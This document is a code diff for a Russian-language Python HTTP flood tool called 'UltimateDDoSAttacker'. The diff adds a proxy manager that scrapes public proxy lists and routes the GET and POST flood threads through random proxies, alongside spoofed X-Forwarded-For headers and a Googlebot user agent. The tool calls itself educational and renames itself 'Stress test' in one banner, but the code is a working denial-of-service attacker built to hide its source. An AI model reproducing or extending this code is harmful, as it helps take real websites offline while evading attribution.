@@ -5,12 +5,12 @@ import random
 import threading
 import socket
 import requests
-import json
 import urllib3
 import platform
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from collections import deque
+import re
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -75,6 +75,62 @@ LOGO = f"""
 {Colors.END}
 """
 
+class ProxyManager:
+    def __init__(self):
+        self.proxies = []
+        self.working_proxies = []
+        self.lock = threading.Lock()
+        
+    def fetch_proxies(self):
+        try:
+            sources = [
+                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all',
+                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt'
+            ]
+            
+            all_proxies = []
+            for source in sources:
+                try:
+                    r = requests.get(source, timeout=5)
+                    if r.status_code == 200:
+                        text = r.text
+                        proxy_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\d{2,5}\b'
+                        found = re.findall(proxy_pattern, text)
+                        all_proxies.extend(found)
+                except:
+                    continue
+                    
+            with self.lock:
+                self.proxies = list(set(all_proxies))[:200]
+                
+            threading.Thread(target=self.test_proxies, daemon=True).start()
+            return self.proxies
+        except:
+            return []
+            
+    def test_proxies(self):
+        working = []
+        test_url = "http://httpbin.org/ip"
+        for proxy in self.proxies[:30]:
+            try:
+                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+                r = requests.get(test_url, proxies=proxies, timeout=3)
+                if r.status_code == 200:
+                    working.append(proxy)
+            except:
+                continue
+        with self.lock:
+            self.working_proxies = working
+            
+    def get_random_proxy(self):
+        with self.lock:
+            if self.working_proxies:
+                return random.choice(self.working_proxies)
+            elif self.proxies:
+                return random.choice(self.proxies)
+        return None
+
 class UltimateDDoSAttacker:
     def __init__(self):
         self.target = ""
@@ -95,28 +151,22 @@ class UltimateDDoSAttacker:
         }
         self.lock = threading.Lock()
         self.workers = []
-        self.proxies = []
         self.use_proxy = False
+        self.proxy_manager = ProxyManager()
         self.disclaimer_shown = False
         
         self.user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
-            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
         ]
         
         self.payloads = []
-        for i in range(100):
-            size = random.randint(512, 4096)
+        for i in range(50):
+            size = random.randint(512, 2048)
             self.payloads.append(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)))
             
         self.attack_patterns = {
@@ -156,6 +206,12 @@ class UltimateDDoSAttacker:
         except:
             return 4, "Unknown", "3.9"
             
+    def get_proxy_dict(self):
+        proxy = self.proxy_manager.get_random_proxy()
+        if proxy:
+            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+        return None
+            
     def show_menu(self):
         cores, system, python_ver = self.get_cpu_cores()
         
@@ -194,6 +250,11 @@ class UltimateDDoSAttacker:
         proxy_input = input(f"{Colors.WHITE}> {Colors.END}").strip().lower()
         self.use_proxy = proxy_input == 'y'
         
+        if self.use_proxy:
+            print(f"\n{Colors.WHITE}[*] Загружаю прокси...{Colors.END}")
+            threading.Thread(target=self.proxy_manager.fetch_proxies, daemon=True).start()
+            time.sleep(2)
+        
         print(f"\n{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
         print(f"║                     ВЫБЕРИТЕ МЕТОД АТАКИ                        ║")
         print(f"╠════════════════════════════════════════════════════════════════════╣")
@@ -230,6 +291,9 @@ class UltimateDDoSAttacker:
         self.method = method_map.get(method_choice, 'HTTP_GET')
         
     def show_config(self):
+        proxy_count = len(self.proxy_manager.proxies) if self.use_proxy else 0
+        working_count = len(self.proxy_manager.working_proxies) if self.use_proxy else 0
+        
         print(f"\n{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
         print(f"║                     КОНФИГУРАЦИЯ АТАКИ                         ║")
         print(f"╠════════════════════════════════════════════════════════════════════╣")
@@ -240,6 +304,9 @@ class UltimateDDoSAttacker:
         print(f"║  • Длительность: {self.duration if self.duration > 0 else 'Бесконечно':<51} ║")
         print(f"║  • Метод: {self.method:<57} ║")
         print(f"║  • Прокси: {'Да' if self.use_proxy else 'Нет':<58} ║")
+        if self.use_proxy:
+            print(f"║  • Прокси загружено: {proxy_count:<47} ║")
+            print(f"║  • Рабочих прокси: {working_count:<49} ║")
         print(f"║                                                                    ║")
         print(f"║  BY WANNACR8                                                      ║")
         print(f"║  СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                                  ║")
@@ -251,28 +318,23 @@ class UltimateDDoSAttacker:
         
     def http_get_attack(self):
         session = requests.Session()
-        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
-        session.mount('http://', adapter)
         
         while self.attacking and not self.paused:
             try:
+                proxies = self.get_proxy_dict() if self.use_proxy else None
+                
                 headers = {
                     'User-Agent': random.choice(self.user_agents),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache'
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Connection': 'keep-alive'
                 }
                 
                 if random.random() > 0.5:
                     headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                    headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 
                 start_time = time.time()
-                r = session.get(self.target, headers=headers, timeout=5, verify=False)
+                r = session.get(self.target, headers=headers, proxies=proxies, timeout=5, verify=False)
                 response_time = time.time() - start_time
                 
                 with self.lock:
@@ -284,7 +346,7 @@ class UltimateDDoSAttacker:
                     self.stats['bytes'] += len(r.content)
                     self.stats['response_times'].append(response_time)
                     
-            except:
+            except Exception as e:
                 with self.lock:
                     self.stats['failed'] += 1
                     self.stats['total'] += 1
@@ -294,16 +356,17 @@ class UltimateDDoSAttacker:
         
         while self.attacking and not self.paused:
             try:
+                proxies = self.get_proxy_dict() if self.use_proxy else None
+                
                 headers = {
                     'User-Agent': random.choice(self.user_agents),
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Accept': '*/*'
+                    'Content-Type': 'application/x-www-form-urlencoded'
                 }
                 
                 data = random.choice(self.payloads)
                 
                 start_time = time.time()
-                r = session.post(self.target, data=data, headers=headers, timeout=5, verify=False)
+                r = session.post(self.target, data=data, headers=headers, proxies=proxies, timeout=5, verify=False)
                 response_time = time.time() - start_time
                 
                 with self.lock:
@@ -325,8 +388,9 @@ class UltimateDDoSAttacker:
         
         while self.attacking and not self.paused:
             try:
+                proxies = self.get_proxy_dict() if self.use_proxy else None
                 headers = {'User-Agent': random.choice(self.user_agents)}
-                r = session.get(self.target, headers=headers, timeout=5, verify=False)
+                r = session.get(self.target, headers=headers, proxies=proxies, timeout=5, verify=False)
                 
                 with self.lock:
                     self.stats['total'] += 1
@@ -416,8 +480,9 @@ class UltimateDDoSAttacker:
         
         while self.attacking and not self.paused:
             try:
+                proxies = self.get_proxy_dict() if self.use_proxy else None
                 headers = {'User-Agent': random.choice(self.user_agents)}
-                r = session.get(self.target, headers=headers, timeout=2, verify=False)
+                r = session.get(self.target, headers=headers, proxies=proxies, timeout=2, verify=False)
                 
                 with self.lock:
                     self.stats['total'] += 1
@@ -437,8 +502,9 @@ class UltimateDDoSAttacker:
         
         while self.attacking and not self.paused:
             try:
+                proxies = self.get_proxy_dict() if self.use_proxy else None
                 headers = {'User-Agent': random.choice(self.user_agents)}
-                r = session.get(self.target, headers=headers, timeout=5, verify=False)
+                r = session.get(self.target, headers=headers, proxies=proxies, timeout=5, verify=False)
                 
                 with self.lock:
                     self.stats['total'] += 1
@@ -462,8 +528,9 @@ class UltimateDDoSAttacker:
         while self.attacking and not self.paused:
             try:
                 session = requests.Session()
+                proxies = self.get_proxy_dict() if self.use_proxy else None
                 headers = {'User-Agent': random.choice(self.user_agents)}
-                r = session.get(self.target, headers=headers, timeout=3, verify=False)
+                r = session.get(self.target, headers=headers, proxies=proxies, timeout=3, verify=False)
                 
                 with self.lock:
                     self.stats['total'] += 1
@@ -509,7 +576,7 @@ class UltimateDDoSAttacker:
             avg_speed = self.stats['total'] / elapsed if elapsed > 0 else 0
             success_rate = (self.stats['success'] / max(self.stats['total'], 1)) * 100
             
-            avg_response = sum(self.stats['response_times']) / max(len(self.stats['response_times']), 1)
+            avg_response = sum(self.stats['response_times']) / max(len(self.stats['response_times']), 1) if self.stats['response_times'] else 0
             
             if self.duration > 0:
                 progress = min(100, (elapsed / self.duration) * 100)
@@ -528,6 +595,9 @@ class UltimateDDoSAttacker:
             else:
                 eta_display = "∞"
                 
+            proxy_count = len(self.proxy_manager.proxies) if self.use_proxy else 0
+            working_count = len(self.proxy_manager.working_proxies) if self.use_proxy else 0
+                
             print(f"""
 {Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
 ║                             LIVE ATTACK STATISTICS                             ║
@@ -535,6 +605,7 @@ class UltimateDDoSAttacker:
 ║                                                                              ║
 ║  ТЕКУЩАЯ ЦЕЛЬ: {self.target[:60]:<60} ║
 ║  МЕТОД: {self.method:<20} ПОТОКИ: {self.threads:<10}                      ║
+║  ПРОКСИ: {'ВКЛ' if self.use_proxy else 'ВЫКЛ':<10} ({working_count}/{proxy_count} рабочих)               ║
 ║                                                                              ║
 ║  ╔════════════════════════════════════════════════════════════════════════╗  ║
 ║  ║                      ДЕТАЛЬНАЯ СТАТИСТИКА                              ║  ║
@@ -568,7 +639,7 @@ class UltimateDDoSAttacker:
 ║  ║              СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                          ║  ║
 ║  ╚════════════════════════════════════════════════════════════════════════╝  ║
 ║                                                                              ║
-║  [КОМАНДЫ] P - Пауза | R - Возобновить | S - Статистика | Q - Выход         ║
+║  [КОМАНДЫ] P - Пауза | R - Возобновить | Q - Выход                          ║
 ║                                                                              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 {Colors.END}""")
@@ -642,7 +713,7 @@ class UltimateDDoSAttacker:
 ║                                                                              ║
 ║  ╔════════════════════════════════════════════════════════════════════════╗  ║
 ║  ║                         BY WANNACR8                                    ║  ║
-║  ║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                  ║  ║
+║  ║              Stress test v06.0 EDUCATIONAL                  ║  ║
 ║  ║                         26.09.2025                                     ║  ║
 ║  ║              СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                          ║  ║
 ║  ╚════════════════════════════════════════════════════════════════════════╝  ║
